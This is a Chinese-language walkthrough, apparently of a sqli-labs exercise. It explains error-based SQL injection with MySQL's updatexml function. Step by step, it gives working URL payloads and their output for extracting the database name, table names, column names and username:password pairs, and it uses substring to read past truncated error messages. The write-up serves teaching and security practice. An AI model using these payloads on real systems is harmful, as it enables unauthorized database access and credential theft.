# 确认闭合类型
到这里，当时输入?id=1'时，会发现是跟第一题一样的报错  
那么就是使用单引号闭合，但是你又会发现，就算输入对了，服务器也没有其他回显  
这时候，你就要考虑其他的sql注入  
比如 这里有报错信息，那么可以使用报错注入  
还有诸多盲注，这里先介绍报错注入  

# 构造报错注入
我们根据payload来讲  
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

常见的报错注入函数有updatexml，extractvalue等，这里先介绍updatexml  
updatexml(1,2,3),其中1和3我们不需要用，构造的语句在2中  
updatexml的作用是修改xml的文档内容，而2中的参数就是修改文档的路径  
我们构造concat(0x7e,(select database()),0x7e)  
concat是将里面的值连成字符串其中0x7e表示~号  
这样可以保证我们需要修改的文档路径一定不存在，且又可以正常回显

这样数据库查询的报错就会被替换成XPATH的报错信息  
回显：XPATH syntax error: '~security~'

剩下的步骤也是一样了，替换里面的查询语句即可

# 查询数据库名
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  
回显：XPATH syntax error: '~security~'

# 查询表名
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+  
回显：XPATH syntax error: '~emails,referers,uagents,users~'

# 查询列名
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e),1)--+  
回显：XPATH syntax error: '~id,username,password~'


# 查询值
注意这个时候我们查询值得时候只有一个地方可以回显，需要调整一下payload  
?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,':',password) from users),0x7e),1)--+  
回显：XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'  
然后又会发现，只回显一部分，这时候可以用substring函数，对查询函数进行截取  
substring((select group_concat(username,':',password) from users),1,10)  
从查询结果的第一个字符开始截取10个字符

?id=1' and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),1,10),0x7e),1)--+  
回显：XPATH syntax error: '~Dumb:Dumb,~'

?id=1' and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),11,10),0x7e),1)--+  
回显：XPATH syntax error: '~Angelina:I~'

?id=1' and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),21,10),0x7e),1)--+  
回显：XPATH syntax error: '~-kill-you,~'

...